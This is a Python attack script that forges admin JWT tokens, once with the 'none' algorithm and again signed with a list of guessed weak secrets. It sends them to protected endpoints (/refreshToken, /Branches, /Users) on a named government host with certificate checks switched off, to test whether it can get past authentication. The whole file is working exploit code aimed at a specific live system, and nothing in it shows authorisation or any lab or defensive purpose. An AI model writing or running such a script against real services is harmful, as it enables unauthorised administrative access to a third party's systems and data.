import requests, json, urllib3, time, base64, hmac, hashlib
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

payload=json.dumps({"user":{"username":"admin","role":"ADMIN"},"permissions":["AUTH_ADMIN","AUTH_USER","AUTH_2FA"],"iat":1700000000,"exp":1999999999}).encode()
header=json.dumps({"alg":"HS256","typ":"JWT"}).encode()

# 找受保护且返回 JSON 的端点 (POST /refreshToken 返回 JSON)
# 用 Bearer token 测试这些端点, 若 token 有效应返回不同响应 (非 401/400 invalid)
print("=== Bearer token 测试受保护端点 (JSON 响应) ===")
# 端点: /refreshToken(POST JSON), /Branches, /Users
def test_token(token, label):
    s=requests.Session(); s.verify=False
    s.headers.update({"User-Agent":"Mozilla/5.0","Authorization":"Bearer "+token})
    # 测试多个受保护端点
    for ep, method, body in [("/refreshToken","POST",{"refreshToken":"x"}),
                              ("/Branches","GET",None),
                              ("/Users","GET",None)]:
        try:
            if method=="POST":
                r=s.post(BASE+ep, json=body, timeout=8)
            else:
                r=s.get(BASE+ep, timeout=8)
            ct=r.headers.get("Content-Type","")[:20]
            print(f"  [{label:18s}] {method} {ep:16s} -> {r.status_code} [{ct}] {r.text[:45]}")
        except Exception as e:
            print(f"  [{label}] {ep} ERR {repr(e)[:25]}")
        time.sleep(0.05)

# none 算法
none_header=json.dumps({"alg":"none","typ":"JWT"}).encode()
none_token=(b64u(none_header)+b'.'+b64u(payload)+b'.').decode()
print(f"\n--- none 算法 token ---")
test_token(none_token,"none")

# 业务弱密钥 HS256
secrets=["secret","password","jwt_secret","epcr","tpf","123456","admin","AUTH_SECRET","epcr_tpf"]
for sec in secrets:
    hp=b64u(header)+b'.'+b64u(payload)
    sig=b64u(hmac.new(sec.encode(), hp, hashlib.sha256).digest())
    token=(hp+b'.'+sig).decode()
    print(f"\n--- HS256 secret={sec} ---")
    test_token(token,f"hs256:{sec}")
print("DONE")
